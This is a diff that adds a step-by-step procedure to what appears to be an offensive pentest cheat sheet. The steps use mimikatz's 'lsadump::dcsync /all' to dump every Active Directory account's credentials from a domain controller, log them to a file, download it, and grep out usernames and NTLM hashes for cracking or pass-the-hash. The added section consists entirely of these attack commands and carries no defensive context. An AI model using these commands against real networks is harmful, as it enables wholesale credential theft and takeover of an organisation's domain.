@@ -21,3 +21,21 @@
 #### 2) privilege::debug
 
 #### 3) lsadump::dcsync /user:KRBTGT_ACCOUNT
+
+# DCSync every single account
+
+#### 1) mimikatz
+
+#### 2) log USERNAME_dcdump.txt
+
+#### 3) lsadump::dcsync /domain:DOMAIN /all
+
+#### 4) exit
+
+#### 5) Download file
+
+#### 6) cat FILE.txt | grep "SAM Username"
+
+#### 7) cat FILE.txt | grep "Hash NTLM"
+
+#### 8) Offline password cracking / Pass-theHash (Mimikatz)
